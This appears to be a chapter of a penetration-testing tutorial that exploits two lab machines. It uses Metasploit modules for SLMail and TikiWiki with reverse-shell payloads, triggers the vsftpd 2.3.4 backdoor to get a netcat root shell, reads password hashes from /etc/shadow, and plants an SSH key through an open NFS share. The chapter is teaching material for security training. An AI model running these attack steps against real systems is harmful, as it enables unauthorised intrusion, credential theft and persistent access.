### Exploiting Vulnerabilities in Windows XP and Linux Targets

#### Introduction
This section details the exploitation of vulnerabilities in both a Windows XP and a Linux target. We will use various techniques, including attacking misconfigured web servers, exploiting backdoored software, taking advantage of poor access control to sensitive files, and leveraging third-party software vulnerabilities.

#### Exploiting the POP3 Issue in Windows XP (CVE-2003-0264)

The Windows XP target is vulnerable to the POP3 issue CVE-2003-0264. The version number reported by SLMail (5.5) aligns with the vulnerability, making it a suitable target for exploitation. The corresponding Metasploit module, `windows/pop3/seattlelab_pass`, has a high rank, indicating a low likelihood of service crashes if the exploit fails.

1. **Exploit Setup:**
   - Load the `windows/pop3/seattlelab_pass` module.
   - Set the payload to `windows/meterpreter/reverse_tcp`.
   - Configure the required options: `RHOST` (target IP), `RPORT` (POP3 port 110), `LHOST` (local IP), and `LPORT` (listening port).

```plaintext
msf > use windows/pop3/seattlelab_pass
msf exploit(seattlelab_pass) > show payloads
msf exploit(seattlelab_pass) > set PAYLOAD windows/meterpreter/reverse_tcp
msf exploit(seattlelab_pass) > show options
msf exploit(seattlelab_pass) > set RHOST 192.168.20.10
msf exploit(seattlelab_pass) > set LHOST 192.168.20.9
msf exploit(seattlelab_pass) > exploit
```

2. **Exploit Execution:**
   - The exploit initiates a reverse handler on the local machine.
   - It attempts to send the payload to the target, resulting in a Meterpreter session.

```plaintext
[*] Started reverse handler on 192.168.20.9:4444
[*] Trying Windows NT/2000/XP/2003 (SLMail 5.5) using jmp esp at 5f4a358f
[*] Sending stage (752128 bytes) to 192.168.20.10
[*] Meterpreter session 4 opened (192.168.20.9:4444 -> 192.168.20.10:1566)
```

#### Exploiting Third-Party Web Applications (TikiWiki)

In Chapter 6, we discovered an installation of TikiWiki CMS version 1.9.8 with a code execution vulnerability in the `graph_formula.php` script. Using Metasploit, we can exploit this vulnerability.

1. **Module Search and Selection:**
   - Search for TikiWiki modules in Metasploit.
   - Select the `exploit/unix/webapp/tikiwiki_graph_formula_exec` module.

```plaintext
msf > search tikiwiki
msf > use exploit/unix/webapp/tikiwiki_graph_formula_exec
msf exploit(tikiwiki_graph_formula_exec) > info
msf exploit(tikiwiki_graph_formula_exec) > show options
```

2. **Configuration and Exploit Execution:**
   - Set the required options: `RHOST` (target IP), `RPORT` (web server port 80), `URI` (TikiWiki directory path `/tikiwiki`), and `LHOST` (local IP).
   - Use the `php/meterpreter/reverse_tcp` payload.
   - Execute the exploit.

```plaintext
msf exploit(tikiwiki_graph_formula_exec) > set RHOST 192.168.20.11
msf exploit(tikiwiki_graph_formula_exec) > set LHOST 192.168.20.9
msf exploit(tikiwiki_graph_formula_exec) > set payload php/meterpreter/reverse_tcp
msf exploit(tikiwiki_graph_formula_exec) > exploit
```

3. **Exploit Results:**
   - The exploit obtains database credentials and executes the payload, resulting in a Meterpreter session.

```plaintext
[*] Started reverse handler on 192.168.20.9:4444
[*] Attempting to obtain database credentials...
[*] TikiWiki database informations:
db_tiki: mysql
dbversion: 1.9
host_tiki: localhost
user_tiki: tikiw
pass_tiki: tikipassword
dbs_tiki: tikiwiki
[*] Sending stage (39217 bytes) to 192.168.20.11
[*] Meterpreter session 5 opened (192.168.20.9:4444 -> 192.168.20.11:54324)
```

#### Exploiting a Compromised Service (Vsftpd Backdoor)

We identified that the FTP server on the Linux target is running a version of Very Secure FTP (Vsftpd) 2.3.4, which may contain a backdoor. To test for the backdoor, we use a specific username format.

1. **Triggering the Backdoor:**
   - Connect to the FTP server and enter a username ending with `:)`.
   - If the backdoor is present, it will trigger without valid credentials.

```plaintext
root@kali:~# ftp 192.168.20.11
Name (192.168.20.11:root): georgia:)
Password:
```

2. **Establishing a Root Shell:**
   - Use Netcat to connect to port 6200, where the root shell should spawn.

```plaintext
root@kali:~# nc 192.168.20.11 6200
# whoami
root
```

3. **Extracting Password Hashes:**
   - With root privileges, extract the password hashes from `/etc/shadow` and save them for later cracking.

```plaintext
# cat /etc/shadow | grep georgia
georgia:$1$CNp3mty6$|RWcT0/PVYpDKwyaWWkSg/:15640:0:99999:7::: > linuxpasswords.txt
```

#### Exploiting Open NFS Shares

The Linux target has exported the home folder of user `georgia` using NFS, and this share is accessible without credentials. We can exploit this to gain further access.

1. **Mounting the NFS Share:**
   - Mount the NFS share on the Kali system.

```plaintext
root@kali:~# mkdir /tmp/mount
root@kali:~# mount -t nfs -o nolock 192.168.20.11:/export/georgia /tmp/mount
```

2. **Accessing SSH Keys:**
   - Navigate to the `.ssh` directory and list its contents.

```plaintext
root@kali:~# cd /tmp/mount/.ssh
root@kali:/tmp/mount/.ssh# ls
authorized_keys id_rsa id_rsa.pub
```

3. **Adding a New SSH Key:**
   - Generate a new SSH key pair on the Kali system.
   - Append the public key to the `authorized_keys` file.

```plaintext
root@kali:~# ssh-keygen
Your identification has been saved in /root/.ssh/id_rsa.
Your public key has been saved in /root/.ssh/id_rsa.pub.
root@kali:~# cat ~/.ssh/id_rsa.pub >> /tmp/mount/.ssh/authorized_keys
```

4. **SSH Access:**
   - Use the newly added public key to SSH into the Linux target as `georgia`.

```plaintext
root@kali:~# ssh georgia@192.168.20.11
georgia@ubuntu:~$
```

#### Summary

In this chapter, we combined the information gathered in previous chapters to exploit multiple vulnerabilities in both the Windows XP and Linux targets. We used various techniques, including attacking misconfigured web servers, exploiting backdoored software, and taking advantage of poor access control. These exploits provided us with a foothold in the systems, setting the stage for further post-exploitation activities.

In the next chapter, we will focus on cracking the passwords we have obtained.